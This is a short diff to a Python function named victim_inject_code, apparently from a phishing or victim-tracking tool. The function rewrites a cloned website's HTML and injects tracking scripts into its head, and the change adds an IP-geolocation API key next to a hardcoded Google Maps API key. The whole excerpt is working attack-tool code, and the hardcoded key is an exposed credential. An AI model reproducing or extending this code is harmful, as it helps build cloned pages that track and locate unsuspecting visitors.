@@ -58,7 +58,7 @@ def victim_headers(ua):
               ("Keep-Alive", "115")
             ]
 
-def victim_inject_code(html, script = 'a', url_to_clone = '', gMapsApiKey = 'AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM'):
+def victim_inject_code(html, script = 'a', url_to_clone = '', gMapsApiKey = 'AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM', IpInfoApiKey = ''):
     url_to_clone = str(url_to_clone)
     html = html.replace('src="', 'src="' + url_to_clone + '/')
     html = html.replace("src='", "src='" + url_to_clone + '/')
@@ -69,7 +69,7 @@ def victim_inject_code(html, script = 'a', url_to_clone = '', gMapsApiKey = 'AIz
     html = html.replace('href="' + url_to_clone + '/' + 'http', 'href="http')
     html = html.replace("href='" + url_to_clone + '/' + 'http', "href='http")
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/libs.min.js"></script></head>')
-    html = html.replace('</head>', '<script type="text/javascript">window.gMapsApiKey="' + str(gMapsApiKey) + '";</script></head>')
+    html = html.replace('</head>', '<script type="text/javascript">window.gMapsApiKey="' + str(gMapsApiKey) + '"; window.IpInfoApiKey="' + str(IpInfoApiKey) + '";</script></head>')
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/base.js"></script></head>')
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/' + script + '.js"></script></head>')
     return html
